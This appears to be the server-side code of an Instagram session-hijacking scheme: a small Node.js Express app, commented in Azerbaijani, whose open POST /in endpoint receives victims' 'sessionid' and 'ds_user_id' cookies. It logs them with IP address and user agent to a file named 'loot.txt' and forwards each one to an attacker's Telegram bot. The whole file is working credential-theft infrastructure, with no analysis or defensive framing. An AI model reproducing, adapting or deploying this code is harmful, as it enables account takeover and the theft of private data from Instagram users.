require("dotenv").config();
const express = require("express");
const fs = require("fs");
const axios = require("axios");
const app = express();

const PORT = process.env.PORT || 10000;

app.use(require("body-parser").json({ limit: "1mb" }));

// CORS ayarları
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// POST /in endpointi
app.post("/in", (req, res) => {
  const { sessionid, ds_user_id } = req.body;

  if (!sessionid) {
    console.log("POST /in: sessionid yoxdur");
    return res.sendStatus(204);
  }

  // Real IP almaq (proxy varsa x-forwarded-for-dan yoxla)
  const ip = req.headers["x-forwarded-for"] || req.ip;

  const entry = {
    ts: new Date().toISOString(),
    ip,
    ua: req.get("User-Agent"),
    sessionid,
    ds_user_id,
  };

  // loot.txt faylına əlavə et (Render-da fayl sistemi ephemeral ola bilər)
  try {
    fs.appendFileSync("loot.txt", JSON.stringify(entry) + "\n");
  } catch (err) {
    console.error("Fayla yazma zamanı xəta:", err);
  }

  // Telegram botuna mesaj göndər
  axios
    .post(`https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.TG_CHAT_ID,
      text: `🎯 IG sessionid\nUser: ${ds_user_id}\nCookie: ${sessionid}\nIP: ${ip}`,
    })
    .then(() => {
      console.log("Telegrama mesaj göndərildi");
    })
    .catch((e) => {
      console.error("Telegram API çağırışında xəta:", e.message);
    });

  res.sendStatus(200);
});

// GET / endpointi - health check
app.get("/", (req, res) => {
  res.send("OK");
});

// Serveri dinləməyə başla
app.listen(PORT, () => {
  console.log(`Server dinləyir port: ${PORT}`);
});
